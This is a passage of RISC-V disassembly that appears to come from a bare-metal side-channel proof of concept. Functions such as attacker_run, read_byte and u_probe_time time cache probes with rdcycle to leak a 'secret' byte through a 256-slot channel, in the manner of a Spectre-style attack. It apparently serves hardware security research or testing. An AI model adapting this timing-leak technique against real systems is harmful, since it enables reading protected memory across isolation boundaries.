    80002288:	fe043703          	ld	a4,-32(s0)
    8000228c:	0ff77713          	zext.b	a4,a4
    80002290:	00e78023          	sb	a4,0(a5)
    80002294:	a819                	j	800022aa <top_four_idx+0x11a>
    80002296:	fd843783          	ld	a5,-40(s0)
    8000229a:	0785                	addi	a5,a5,1
    8000229c:	fcf43c23          	sd	a5,-40(s0)
    800022a0:	fd843703          	ld	a4,-40(s0)
    800022a4:	478d                	li	a5,3
    800022a6:	f4e7fbe3          	bgeu	a5,a4,800021fc <top_four_idx+0x6c>
    800022aa:	fe043783          	ld	a5,-32(s0)
    800022ae:	0785                	addi	a5,a5,1
    800022b0:	fef43023          	sd	a5,-32(s0)
    800022b4:	fe043703          	ld	a4,-32(s0)
    800022b8:	fb043783          	ld	a5,-80(s0)
    800022bc:	f2f764e3          	bltu	a4,a5,800021e4 <top_four_idx+0x54>
    800022c0:	0001                	nop
    800022c2:	0001                	nop
    800022c4:	6466                	ld	s0,88(sp)
    800022c6:	6125                	addi	sp,sp,96
    800022c8:	8082                	ret
    800022ca:	00000013          	nop
    800022ce:	0001                	nop

00000000800022d0 <enough_confidence>:
    800022d0:	7139                	addi	sp,sp,-64
    800022d2:	fc06                	sd	ra,56(sp)
    800022d4:	f822                	sd	s0,48(sp)
    800022d6:	0080                	addi	s0,sp,64
    800022d8:	fca43423          	sd	a0,-56(s0)
    800022dc:	fd840713          	addi	a4,s0,-40
    800022e0:	fe840793          	addi	a5,s0,-24
    800022e4:	86ba                	mv	a3,a4
    800022e6:	863e                	mv	a2,a5
    800022e8:	10000593          	li	a1,256
    800022ec:	fc843503          	ld	a0,-56(s0)
    800022f0:	da1ff0ef          	jal	80002090 <top_two_idx>
    800022f4:	fd843703          	ld	a4,-40(s0)
    800022f8:	4785                	li	a5,1
    800022fa:	00e7fb63          	bgeu	a5,a4,80002310 <enough_confidence+0x40>
    800022fe:	fd843703          	ld	a4,-40(s0)
    80002302:	fe043783          	ld	a5,-32(s0)
    80002306:	0785                	addi	a5,a5,1
    80002308:	00f76463          	bltu	a4,a5,80002310 <enough_confidence+0x40>
    8000230c:	4785                	li	a5,1
    8000230e:	a011                	j	80002312 <enough_confidence+0x42>
    80002310:	4781                	li	a5,0
    80002312:	853e                	mv	a0,a5
    80002314:	70e2                	ld	ra,56(sp)
    80002316:	7442                	ld	s0,48(sp)
    80002318:	6121                	addi	sp,sp,64
    8000231a:	8082                	ret
    8000231c:	00000013          	nop

0000000080002320 <u_probe_time>:
    80002320:	7139                	addi	sp,sp,-64
    80002322:	fc22                	sd	s0,56(sp)
    80002324:	0080                	addi	s0,sp,64
    80002326:	fca43423          	sd	a0,-56(s0)
    8000232a:	fc843783          	ld	a5,-56(s0)
    8000232e:	0330000f          	fence	rw,rw
    80002332:	c0002673          	rdcycle	a2
    80002336:	0007c703          	lbu	a4,0(a5)
    8000233a:	0330000f          	fence	rw,rw
    8000233e:	c00026f3          	rdcycle	a3
    80002342:	fec43423          	sd	a2,-24(s0)
    80002346:	fed43023          	sd	a3,-32(s0)
    8000234a:	fce40fa3          	sb	a4,-33(s0)
    8000234e:	fe043703          	ld	a4,-32(s0)
    80002352:	fe843783          	ld	a5,-24(s0)
    80002356:	40f707b3          	sub	a5,a4,a5
    8000235a:	853e                	mv	a0,a5
    8000235c:	7462                	ld	s0,56(sp)
    8000235e:	6121                	addi	sp,sp,64
    80002360:	8082                	ret
    80002362:	0001                	nop
    80002364:	00000013          	nop
    80002368:	00000013          	nop
    8000236c:	00000013          	nop

0000000080002370 <probe_direct_secret_access>:
    80002370:	1101                	addi	sp,sp,-32
    80002372:	ec22                	sd	s0,24(sp)
    80002374:	1000                	addi	s0,sp,32
    80002376:	fe043423          	sd	zero,-24(s0)
    8000237a:	00016797          	auipc	a5,0x16
    8000237e:	c8678793          	addi	a5,a5,-890 # 80018000 <direct_secret_fault_seen>
    80002382:	0007b023          	sd	zero,0(a5)
    80002386:	00017797          	auipc	a5,0x17
    8000238a:	c7a78793          	addi	a5,a5,-902 # 80019000 <direct_secret_read_completed>
    8000238e:	0007b023          	sd	zero,0(a5)
    80002392:	00018797          	auipc	a5,0x18
    80002396:	c6e78793          	addi	a5,a5,-914 # 8001a000 <direct_secret_read_value>
    8000239a:	0007b023          	sd	zero,0(a5)
    8000239e:	00015797          	auipc	a5,0x15
    800023a2:	c6278793          	addi	a5,a5,-926 # 80017000 <direct_secret_fault_expected>
    800023a6:	4705                	li	a4,1
    800023a8:	e398                	sd	a4,0(a5)
    800023aa:	00005717          	auipc	a4,0x5
    800023ae:	c5670713          	addi	a4,a4,-938 # 80007000 <secret>
    800023b2:	00074783          	lbu	a5,0(a4)
    800023b6:	fef43423          	sd	a5,-24(s0)
    800023ba:	00015797          	auipc	a5,0x15
    800023be:	c4678793          	addi	a5,a5,-954 # 80017000 <direct_secret_fault_expected>
    800023c2:	0007b023          	sd	zero,0(a5)
    800023c6:	00016797          	auipc	a5,0x16
    800023ca:	c3a78793          	addi	a5,a5,-966 # 80018000 <direct_secret_fault_seen>
    800023ce:	639c                	ld	a5,0(a5)
    800023d0:	ef91                	bnez	a5,800023ec <probe_direct_secret_access+0x7c>
    800023d2:	00018797          	auipc	a5,0x18
    800023d6:	c2e78793          	addi	a5,a5,-978 # 8001a000 <direct_secret_read_value>
    800023da:	fe843703          	ld	a4,-24(s0)
    800023de:	e398                	sd	a4,0(a5)
    800023e0:	00017797          	auipc	a5,0x17
    800023e4:	c2078793          	addi	a5,a5,-992 # 80019000 <direct_secret_read_completed>
    800023e8:	4705                	li	a4,1
    800023ea:	e398                	sd	a4,0(a5)
    800023ec:	0001                	nop
    800023ee:	6462                	ld	s0,24(sp)
    800023f0:	6105                	addi	sp,sp,32
    800023f2:	8082                	ret
    800023f4:	00000013          	nop
    800023f8:	00000013          	nop
    800023fc:	00000013          	nop

0000000080002400 <svc_v2_round_asm>:
    80002400:	1101                	addi	sp,sp,-32
    80002402:	ec22                	sd	s0,24(sp)
    80002404:	1000                	addi	s0,sp,32
    80002406:	fea43423          	sd	a0,-24(s0)
    8000240a:	feb43023          	sd	a1,-32(s0)
    8000240e:	fe843783          	ld	a5,-24(s0)
    80002412:	853e                	mv	a0,a5
    80002414:	fe043783          	ld	a5,-32(s0)
    80002418:	85be                	mv	a1,a5
    8000241a:	4895                	li	a7,5
    8000241c:	00000073          	ecall
    80002420:	0001                	nop
    80002422:	6462                	ld	s0,24(sp)
    80002424:	6105                	addi	sp,sp,32
    80002426:	8082                	ret
    80002428:	00000013          	nop
    8000242c:	00000013          	nop

0000000080002430 <svc_exit>:
    80002430:	1101                	addi	sp,sp,-32
    80002432:	ec22                	sd	s0,24(sp)
    80002434:	1000                	addi	s0,sp,32
    80002436:	fea43423          	sd	a0,-24(s0)
    8000243a:	fe843503          	ld	a0,-24(s0)
    8000243e:	4891                	li	a7,4
    80002440:	00000073          	ecall
    80002444:	00000013          	nop
    80002448:	00000013          	nop
    8000244c:	00000013          	nop

0000000080002450 <read_byte>:
    80002450:	7159                	addi	sp,sp,-112
    80002452:	f486                	sd	ra,104(sp)
    80002454:	f0a2                	sd	s0,96(sp)
    80002456:	1880                	addi	s0,sp,112
    80002458:	72fd                	lui	t0,0xfffff
    8000245a:	9116                	add	sp,sp,t0
    8000245c:	77fd                	lui	a5,0xfffff
    8000245e:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    80002460:	97a2                	add	a5,a5,s0
    80002462:	faa7b423          	sd	a0,-88(a5)
    80002466:	77fd                	lui	a5,0xfffff
    80002468:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    8000246a:	97a2                	add	a5,a5,s0
    8000246c:	fab7b023          	sd	a1,-96(a5)
    80002470:	fa040fa3          	sb	zero,-65(s0)
    80002474:	fe043423          	sd	zero,-24(s0)
    80002478:	a005                	j	80002498 <read_byte+0x48>
    8000247a:	77fd                	lui	a5,0xfffff
    8000247c:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    8000247e:	00878733          	add	a4,a5,s0
    80002482:	fe843783          	ld	a5,-24(s0)
    80002486:	078e                	slli	a5,a5,0x3
    80002488:	97ba                	add	a5,a5,a4
    8000248a:	7a07b823          	sd	zero,1968(a5)
    8000248e:	fe843783          	ld	a5,-24(s0)
    80002492:	0785                	addi	a5,a5,1
    80002494:	fef43423          	sd	a5,-24(s0)
    80002498:	fe843703          	ld	a4,-24(s0)
    8000249c:	0ff00793          	li	a5,255
    800024a0:	fce7fde3          	bgeu	a5,a4,8000247a <read_byte+0x2a>
    800024a4:	fe043023          	sd	zero,-32(s0)
    800024a8:	a005                	j	800024c8 <read_byte+0x78>
    800024aa:	77fd                	lui	a5,0xfffff
    800024ac:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    800024ae:	00878733          	add	a4,a5,s0
    800024b2:	fe043783          	ld	a5,-32(s0)
    800024b6:	078e                	slli	a5,a5,0x3
    800024b8:	97ba                	add	a5,a5,a4
    800024ba:	fa07b823          	sd	zero,-80(a5)
    800024be:	fe043783          	ld	a5,-32(s0)
    800024c2:	0785                	addi	a5,a5,1
    800024c4:	fef43023          	sd	a5,-32(s0)
    800024c8:	fe043703          	ld	a4,-32(s0)
    800024cc:	0ff00793          	li	a5,255
    800024d0:	fce7fde3          	bgeu	a5,a4,800024aa <read_byte+0x5a>
    800024d4:	fa043823          	sd	zero,-80(s0)
    800024d8:	0001                	nop
    800024da:	fc043c23          	sd	zero,-40(s0)
    800024de:	aa01                	j	800025ee <read_byte+0x19e>
    800024e0:	77fd                	lui	a5,0xfffff
    800024e2:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    800024e4:	97a2                	add	a5,a5,s0
    800024e6:	00006597          	auipc	a1,0x6
    800024ea:	b1a58593          	addi	a1,a1,-1254 # 80008000 <channel>
    800024ee:	fa87b503          	ld	a0,-88(a5)
    800024f2:	f0fff0ef          	jal	80002400 <svc_v2_round_asm>
    800024f6:	fc043823          	sd	zero,-48(s0)
    800024fa:	fc043423          	sd	zero,-56(s0)
    800024fe:	a869                	j	80002598 <read_byte+0x148>
    80002500:	fd843583          	ld	a1,-40(s0)
    80002504:	fc843503          	ld	a0,-56(s0)
    80002508:	b59ff0ef          	jal	80002060 <reload_mix>
    8000250c:	faa43423          	sd	a0,-88(s0)
    80002510:	fa843503          	ld	a0,-88(s0)
    80002514:	aedff0ef          	jal	80002000 <is_candidate_value>
    80002518:	87aa                	mv	a5,a0
    8000251a:	c7bd                	beqz	a5,80002588 <read_byte+0x138>
    8000251c:	fa843783          	ld	a5,-88(s0)
    80002520:	c7b5                	beqz	a5,8000258c <read_byte+0x13c>
    80002522:	fd043783          	ld	a5,-48(s0)
    80002526:	0785                	addi	a5,a5,1
    80002528:	fcf43823          	sd	a5,-48(s0)
    8000252c:	fa843783          	ld	a5,-88(s0)
    80002530:	00679713          	slli	a4,a5,0x6
    80002534:	00006797          	auipc	a5,0x6
    80002538:	acc78793          	addi	a5,a5,-1332 # 80008000 <channel>
    8000253c:	97ba                	add	a5,a5,a4
    8000253e:	853e                	mv	a0,a5
    80002540:	de1ff0ef          	jal	80002320 <u_probe_time>
    80002544:	faa43023          	sd	a0,-96(s0)
    80002548:	00014797          	auipc	a5,0x14
    8000254c:	ab878793          	addi	a5,a5,-1352 # 80016000 <active_threshold>
    80002550:	639c                	ld	a5,0(a5)
    80002552:	fa043703          	ld	a4,-96(s0)
    80002556:	02e7ec63          	bltu	a5,a4,8000258e <read_byte+0x13e>
    8000255a:	77fd                	lui	a5,0xfffff
    8000255c:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    8000255e:	00878733          	add	a4,a5,s0
    80002562:	fa843783          	ld	a5,-88(s0)
    80002566:	078e                	slli	a5,a5,0x3
    80002568:	97ba                	add	a5,a5,a4
    8000256a:	7b07b783          	ld	a5,1968(a5)
    8000256e:	00178713          	addi	a4,a5,1
    80002572:	77fd                	lui	a5,0xfffff
    80002574:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    80002576:	008786b3          	add	a3,a5,s0
    8000257a:	fa843783          	ld	a5,-88(s0)
    8000257e:	078e                	slli	a5,a5,0x3
    80002580:	97b6                	add	a5,a5,a3
    80002582:	7ae7b823          	sd	a4,1968(a5)
    80002586:	a021                	j	8000258e <read_byte+0x13e>
    80002588:	0001                	nop
    8000258a:	a011                	j	8000258e <read_byte+0x13e>
    8000258c:	0001                	nop
    8000258e:	fc843783          	ld	a5,-56(s0)
    80002592:	0785                	addi	a5,a5,1
    80002594:	fcf43423          	sd	a5,-56(s0)
    80002598:	fc843703          	ld	a4,-56(s0)
    8000259c:	0ff00793          	li	a5,255
    800025a0:	00e7e863          	bltu	a5,a4,800025b0 <read_byte+0x160>
    800025a4:	fd043703          	ld	a4,-48(s0)
    800025a8:	03d00793          	li	a5,61
    800025ac:	f4e7fae3          	bgeu	a5,a4,80002500 <read_byte+0xb0>
    800025b0:	fd843783          	ld	a5,-40(s0)
    800025b4:	00178713          	addi	a4,a5,1
    800025b8:	00013697          	auipc	a3,0x13
    800025bc:	a4868693          	addi	a3,a3,-1464 # 80015000 <tries_used>
    800025c0:	77fd                	lui	a5,0xfffff
    800025c2:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    800025c4:	97a2                	add	a5,a5,s0
    800025c6:	fa07b783          	ld	a5,-96(a5)
    800025ca:	078e                	slli	a5,a5,0x3
    800025cc:	97b6                	add	a5,a5,a3
    800025ce:	e398                	sd	a4,0(a5)
    800025d0:	77fd                	lui	a5,0xfffff
    800025d2:	7b078793          	addi	a5,a5,1968 # fffffffffffff7b0 <_pmem_end+0xffffffff3ffff7b0>
    800025d6:	17c1                	addi	a5,a5,-16
    800025d8:	97a2                	add	a5,a5,s0
    800025da:	853e                	mv	a0,a5
    800025dc:	cf5ff0ef          	jal	800022d0 <enough_confidence>
    800025e0:	87aa                	mv	a5,a0
    800025e2:	ef81                	bnez	a5,800025fa <read_byte+0x1aa>
    800025e4:	fd843783          	ld	a5,-40(s0)
    800025e8:	0785                	addi	a5,a5,1
    800025ea:	fcf43c23          	sd	a5,-40(s0)
    800025ee:	fd843703          	ld	a4,-40(s0)
    800025f2:	479d                	li	a5,7
    800025f4:	eee7f6e3          	bgeu	a5,a4,800024e0 <read_byte+0x90>
    800025f8:	a011                	j	800025fc <read_byte+0x1ac>
    800025fa:	0001                	nop
    800025fc:	77fd                	lui	a5,0xfffff
    800025fe:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    80002600:	97a2                	add	a5,a5,s0
    80002602:	fa07b783          	ld	a5,-96(a5)
    80002606:	00179713          	slli	a4,a5,0x1
    8000260a:	0000e797          	auipc	a5,0xe
    8000260e:	9f678793          	addi	a5,a5,-1546 # 80010000 <leaked_idx>
    80002612:	00f70633          	add	a2,a4,a5
    80002616:	77fd                	lui	a5,0xfffff
    80002618:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    8000261a:	97a2                	add	a5,a5,s0
    8000261c:	fa07b783          	ld	a5,-96(a5)
    80002620:	00479713          	slli	a4,a5,0x4
    80002624:	0000f797          	auipc	a5,0xf
    80002628:	9dc78793          	addi	a5,a5,-1572 # 80011000 <leaked_score>
    8000262c:	973e                	add	a4,a4,a5
    8000262e:	77fd                	lui	a5,0xfffff
    80002630:	7b078793          	addi	a5,a5,1968 # fffffffffffff7b0 <_pmem_end+0xffffffff3ffff7b0>
    80002634:	17c1                	addi	a5,a5,-16
    80002636:	97a2                	add	a5,a5,s0
    80002638:	86ba                	mv	a3,a4
    8000263a:	10000593          	li	a1,256
    8000263e:	853e                	mv	a0,a5
    80002640:	a51ff0ef          	jal	80002090 <top_two_idx>
    80002644:	77fd                	lui	a5,0xfffff
    80002646:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    80002648:	97a2                	add	a5,a5,s0
    8000264a:	fa07b783          	ld	a5,-96(a5)
    8000264e:	00279713          	slli	a4,a5,0x2
    80002652:	00010797          	auipc	a5,0x10
    80002656:	9ae78793          	addi	a5,a5,-1618 # 80012000 <leaked_top_idx>
    8000265a:	00f70633          	add	a2,a4,a5
    8000265e:	77fd                	lui	a5,0xfffff
    80002660:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    80002662:	97a2                	add	a5,a5,s0
    80002664:	fa07b783          	ld	a5,-96(a5)
    80002668:	00579713          	slli	a4,a5,0x5
    8000266c:	00011797          	auipc	a5,0x11
    80002670:	99478793          	addi	a5,a5,-1644 # 80013000 <leaked_top_score>
    80002674:	973e                	add	a4,a4,a5
    80002676:	77fd                	lui	a5,0xfffff
    80002678:	7b078793          	addi	a5,a5,1968 # fffffffffffff7b0 <_pmem_end+0xffffffff3ffff7b0>
    8000267c:	17c1                	addi	a5,a5,-16
    8000267e:	97a2                	add	a5,a5,s0
    80002680:	86ba                	mv	a3,a4
    80002682:	10000593          	li	a1,256
    80002686:	853e                	mv	a0,a5
    80002688:	b09ff0ef          	jal	80002190 <top_four_idx>
    8000268c:	fc043023          	sd	zero,-64(s0)
    80002690:	a089                	j	800026d2 <read_byte+0x282>
    80002692:	77fd                	lui	a5,0xfffff
    80002694:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    80002696:	00878733          	add	a4,a5,s0
    8000269a:	fc043783          	ld	a5,-64(s0)
    8000269e:	078e                	slli	a5,a5,0x3
    800026a0:	97ba                	add	a5,a5,a4
    800026a2:	7b07b703          	ld	a4,1968(a5)
    800026a6:	00012697          	auipc	a3,0x12
    800026aa:	95a68693          	addi	a3,a3,-1702 # 80014000 <leaked_hits>
    800026ae:	77fd                	lui	a5,0xfffff
    800026b0:	17c1                	addi	a5,a5,-16 # ffffffffffffeff0 <_pmem_end+0xffffffff3fffeff0>
    800026b2:	97a2                	add	a5,a5,s0
    800026b4:	fa07b783          	ld	a5,-96(a5)
    800026b8:	00879613          	slli	a2,a5,0x8
    800026bc:	fc043783          	ld	a5,-64(s0)
    800026c0:	97b2                	add	a5,a5,a2
    800026c2:	078e                	slli	a5,a5,0x3
    800026c4:	97b6                	add	a5,a5,a3
    800026c6:	e398                	sd	a4,0(a5)
    800026c8:	fc043783          	ld	a5,-64(s0)
    800026cc:	0785                	addi	a5,a5,1
    800026ce:	fcf43023          	sd	a5,-64(s0)
    800026d2:	fc043703          	ld	a4,-64(s0)
    800026d6:	0ff00793          	li	a5,255
    800026da:	fae7fce3          	bgeu	a5,a4,80002692 <read_byte+0x242>
    800026de:	0001                	nop
    800026e0:	0001                	nop
    800026e2:	6285                	lui	t0,0x1
    800026e4:	9116                	add	sp,sp,t0
    800026e6:	70a6                	ld	ra,104(sp)
    800026e8:	7406                	ld	s0,96(sp)
    800026ea:	6165                	addi	sp,sp,112
    800026ec:	8082                	ret
    800026ee:	0001                	nop

00000000800026f0 <attacker_run>:
    800026f0:	1101                	addi	sp,sp,-32
    800026f2:	ec06                	sd	ra,24(sp)
    800026f4:	e822                	sd	s0,16(sp)
    800026f6:	1000                	addi	s0,sp,32
    800026f8:	c79ff0ef          	jal	80002370 <probe_direct_secret_access>
    800026fc:	fe043423          	sd	zero,-24(s0)
    80002700:	a025                	j	80002728 <attacker_run+0x38>
    80002702:	fe843783          	ld	a5,-24(s0)
    80002706:	00578713          	addi	a4,a5,5
    8000270a:	00005797          	auipc	a5,0x5
    8000270e:	8f678793          	addi	a5,a5,-1802 # 80007000 <secret>
    80002712:	97ba                	add	a5,a5,a4
    80002714:	fe843583          	ld	a1,-24(s0)
    80002718:	853e                	mv	a0,a5
    8000271a:	d37ff0ef          	jal	80002450 <read_byte>
    8000271e:	fe843783          	ld	a5,-24(s0)
    80002722:	0785                	addi	a5,a5,1
    80002724:	fef43423          	sd	a5,-24(s0)
    80002728:	fe843783          	ld	a5,-24(s0)
    8000272c:	dbf9                	beqz	a5,80002702 <attacker_run+0x12>
    8000272e:	4781                	li	a5,0
    80002730:	853e                	mv	a0,a5
    80002732:	60e2                	ld	ra,24(sp)
    80002734:	6442                	ld	s0,16(sp)
    80002736:	6105                	addi	sp,sp,32
    80002738:	8082                	ret
    8000273a:	00000013          	nop
    8000273e:	0001                	nop

0000000080002740 <attacker_entry>:
    80002740:	1141                	addi	sp,sp,-16
    80002742:	e406                	sd	ra,8(sp)
    80002744:	e022                	sd	s0,0(sp)
    80002746:	0800                	addi	s0,sp,16
    80002748:	fa9ff0ef          	jal	800026f0 <attacker_run>
    8000274c:	87aa                	mv	a5,a0
    8000274e:	853e                	mv	a0,a5
    80002750:	ce1ff0ef          	jal	80002430 <svc_exit>
    80002754:	10500073          	wfi
    80002758:	bff5                	j	80002754 <attacker_entry+0x14>
    8000275a:	00000013          	nop
    8000275e:	00000013          	nop
    80002762:	00000013          	nop
    80002766:	00000013          	nop
    8000276a:	00000013          	nop
    8000276e:	00000013          	nop
    80002772:	00000013          	nop
    80002776:	00000013          	nop
    8000277a:	00000013          	nop
    8000277e:	00000013          	nop
    80002782:	00000013          	nop
    80002786:	00000013          	nop
    8000278a:	00000013          	nop
    8000278e:	00000013          	nop
    80002792:	00000013          	nop
    80002796:	00000013          	nop
    8000279a:	00000013          	nop
    8000279e:	00000013          	nop
    800027a2:	00000013          	nop
    800027a6:	00000013          	nop
    800027aa:	00000013          	nop
    800027ae:	00000013          	nop
    800027b2:	00000013          	nop
    800027b6:	00000013          	nop
    800027ba:	00000013          	nop
    800027be:	00000013          	nop
    800027c2:	00000013          	nop
    800027c6:	00000013          	nop
    800027ca:	00000013          	nop
    800027ce:	00000013          	nop
    800027d2:	00000013          	nop
    800027d6:	00000013          	nop
    800027da:	00000013          	nop
    800027de:	00000013          	nop
    800027e2:	00000013          	nop
    800027e6:	00000013          	nop
    800027ea:	00000013          	nop
    800027ee:	00000013          	nop
    800027f2:	00000013          	nop
    800027f6:	00000013          	nop
    800027fa:	00000013          	nop
    800027fe:	00000013          	nop
    80002802:	00000013          	nop
    80002806:	00000013          	nop
    8000280a:	00000013          	nop
    8000280e:	00000013          	nop
    80002812:	00000013          	nop
    80002816:	00000013          	nop
    8000281a:	00000013          	nop
    8000281e:	00000013          	nop
    80002822:	00000013          	nop
    80002826:	00000013          	nop
    8000282a:	00000013          	nop
    8000282e:	00000013          	nop
    80002832:	00000013          	nop
    80002836:	00000013          	nop
    8000283a:	00000013          	nop
    8000283e:	00000013          	nop
    80002842:	00000013          	nop
    80002846:	00000013          	nop
    8000284a:	00000013          	nop
    8000284e:	00000013          	nop
    80002852:	00000013          	nop
    80002856:	00000013          	nop
    8000285a:	00000013          	nop
    8000285e:	00000013          	nop
    80002862:	00000013          	nop
    80002866:	00000013          	nop
    8000286a:	00000013          	nop
    8000286e:	00000013          	nop
    80002872:	00000013          	nop
    80002876:	00000013          	nop
    8000287a:	00000013          	nop
    8000287e:	00000013          	nop
    80002882:	00000013          	nop
    80002886:	00000013          	nop
    8000288a:	00000013          	nop
    8000288e:	00000013          	nop
    80002892:	00000013          	nop
    80002896:	00000013          	nop
    8000289a:	00000013          	nop
    8000289e:	00000013          	nop
    800028a2:	00000013          	nop
    800028a6:	00000013          	nop
    800028aa:	00000013          	nop
    800028ae:	00000013          	nop
    800028b2:	00000013          	nop
    800028b6:	00000013          	nop
    800028ba:	00000013          	nop
    800028be:	00000013          	nop
    800028c2:	00000013          	nop
    800028c6:	00000013          	nop
    800028ca:	00000013          	nop
    800028ce:	00000013          	nop
    800028d2:	00000013          	nop
    800028d6:	00000013          	nop
    800028da:	00000013          	nop
    800028de:	00000013          	nop
    800028e2:	00000013          	nop
    800028e6:	00000013          	nop
    800028ea:	00000013          	nop
    800028ee:	00000013          	nop
    800028f2:	00000013          	nop
    800028f6:	00000013          	nop
    800028fa:	00000013          	nop
    800028fe:	00000013          	nop
    80002902:	00000013          	nop
    80002906:	00000013          	nop
    8000290a:	00000013          	nop
    8000290e:	00000013          	nop
    80002912:	00000013          	nop
    80002916:	00000013          	nop
    8000291a:	00000013          	nop
    8000291e:	00000013          	nop
    80002922:	00000013          	nop
    80002926:	00000013          	nop
    8000292a:	00000013          	nop
    8000292e:	00000013          	nop
    80002932:	00000013          	nop
    80002936:	00000013          	nop
    8000293a:	00000013          	nop
    8000293e:	00000013          	nop
    80002942:	00000013          	nop
    80002946:	00000013          	nop
    8000294a:	00000013          	nop
    8000294e:	00000013          	nop
    80002952:	00000013          	nop
    80002956:	00000013          	nop
    8000295a:	00000013          	nop
    8000295e:	00000013          	nop
    80002962:	00000013          	nop
    80002966:	00000013          	nop
    8000296a:	00000013          	nop
    8000296e:	00000013          	nop
    80002972:	00000013          	nop
    80002976:	00000013          	nop
    8000297a:	00000013          	nop
    8000297e:	00000013          	nop
    80002982:	00000013          	nop
    80002986:	00000013          	nop
    8000298a:	00000013          	nop
    8000298e:	00000013          	nop
    80002992:	00000013          	nop
    80002996:	00000013          	nop
    8000299a:	00000013          	nop
    8000299e:	00000013          	nop
    800029a2:	00000013          	nop
    800029a6:	00000013          	nop
    800029aa:	00000013          	nop
    800029ae:	00000013          	nop
    800029b2:	00000013          	nop
    800029b6:	00000013          	nop
    800029ba:	00000013          	nop
    800029be:	00000013          	nop
    800029c2:	00000013          	nop
    800029c6:	00000013          	nop
    800029ca:	00000013          	nop
    800029ce:	00000013          	nop
    800029d2:	00000013          	nop
    800029d6:	00000013          	nop
    800029da:	00000013          	nop
    800029de:	00000013          	nop
    800029e2:	00000013          	nop
    800029e6:	00000013          	nop
    800029ea:	00000013          	nop
    800029ee:	00000013          	nop
    800029f2:	00000013          	nop
    800029f6:	00000013          	nop
    800029fa:	00000013          	nop
    800029fe:	00000013          	nop
    80002a02:	00000013          	nop
    80002a06:	00000013          	nop
    80002a0a:	00000013          	nop
    80002a0e:	00000013          	nop
    80002a12:	00000013          	nop
    80002a16:	00000013          	nop
    80002a1a:	00000013          	nop
    80002a1e:	00000013          	nop
    80002a22:	00000013          	nop
    80002a26:	00000013          	nop
    80002a2a:	00000013          	nop
    80002a2e:	00000013          	nop
    80002a32:	00000013          	nop
    80002a36:	00000013          	nop
    80002a3a:	00000013          	nop
    80002a3e:	00000013          	nop
    80002a42:	00000013          	nop
    80002a46:	00000013          	nop
    80002a4a:	00000013          	nop
    80002a4e:	00000013          	nop
    80002a52:	00000013          	nop
    80002a56:	00000013          	nop
    80002a5a:	00000013          	nop
    80002a5e:	00000013          	nop
    80002a62:	00000013          	nop
    80002a66:	00000013          	nop
    80002a6a:	00000013          	nop
    80002a6e:	00000013          	nop
    80002a72:	00000013          	nop
    80002a76:	00000013          	nop
    80002a7a:	00000013          	nop
    80002a7e:	00000013          	nop
    80002a82:	00000013          	nop
    80002a86:	00000013          	nop
    80002a8a:	00000013          	nop
    80002a8e:	00000013          	nop
    80002a92:	00000013          	nop
    80002a96:	00000013          	nop
    80002a9a:	00000013          	nop
    80002a9e:	00000013          	nop
    80002aa2:	00000013          	nop
    80002aa6:	00000013          	nop
    80002aaa:	00000013          	nop
    80002aae:	00000013          	nop
    80002ab2:	00000013          	nop
    80002ab6:	00000013          	nop
    80002aba:	00000013          	nop
    80002abe:	00000013          	nop
    80002ac2:	00000013          	nop
    80002ac6:	00000013          	nop
    80002aca:	00000013          	nop
    80002ace:	00000013          	nop
    80002ad2:	00000013          	nop
    80002ad6:	00000013          	nop
    80002ada:	00000013          	nop
    80002ade:	00000013          	nop
    80002ae2:	00000013          	nop
    80002ae6:	00000013          	nop
    80002aea:	00000013          	nop
    80002aee:	00000013          	nop
    80002af2:	00000013          	nop
    80002af6:	00000013          	nop
    80002afa:	00000013          	nop
    80002afe:	00000013          	nop
    80002b02:	00000013          	nop
    80002b06:	00000013          	nop
    80002b0a:	00000013          	nop
    80002b0e:	00000013          	nop
    80002b12:	00000013          	nop
    80002b16:	00000013          	nop
    80002b1a:	00000013          	nop
    80002b1e:	00000013          	nop
    80002b22:	00000013          	nop
    80002b26:	00000013          	nop
    80002b2a:	00000013          	nop
    80002b2e:	00000013          	nop
    80002b32:	00000013          	nop
    80002b36:	00000013          	nop
    80002b3a:	00000013          	nop
    80002b3e:	00000013          	nop
    80002b42:	00000013          	nop
    80002b46:	00000013          	nop
    80002b4a:	00000013          	nop
    80002b4e:	00000013          	nop
    80002b52:	00000013          	nop
    80002b56:	00000013          	nop
    80002b5a:	00000013          	nop
    80002b5e:	00000013          	nop
    80002b62:	00000013          	nop
    80002b66:	00000013          	nop
    80002b6a:	00000013          	nop
    80002b6e:	00000013          	nop
    80002b72:	00000013          	nop
    80002b76:	00000013          	nop
    80002b7a:	00000013          	nop
    80002b7e:	00000013          	nop
    80002b82:	00000013          	nop
    80002b86:	00000013          	nop
    80002b8a:	00000013          	nop
    80002b8e:	00000013          	nop
    80002b92:	00000013          	nop
    80002b96:	00000013          	nop
    80002b9a:	00000013          	nop
    80002b9e:	00000013          	nop
    80002ba2:	00000013          	nop
    80002ba6:	00000013          	nop
    80002baa:	00000013          	nop
    80002bae:	00000013          	nop
    80002bb2:	00000013          	nop
    80002bb6:	00000013          	nop
    80002bba:	00000013          	nop
    80002bbe:	00000013          	nop
    80002bc2:	00000013          	nop
    80002bc6:	00000013          	nop
    80002bca:	00000013          	nop
    80002bce:	00000013          	nop
    80002bd2:	00000013          	nop
    80002bd6:	00000013          	nop
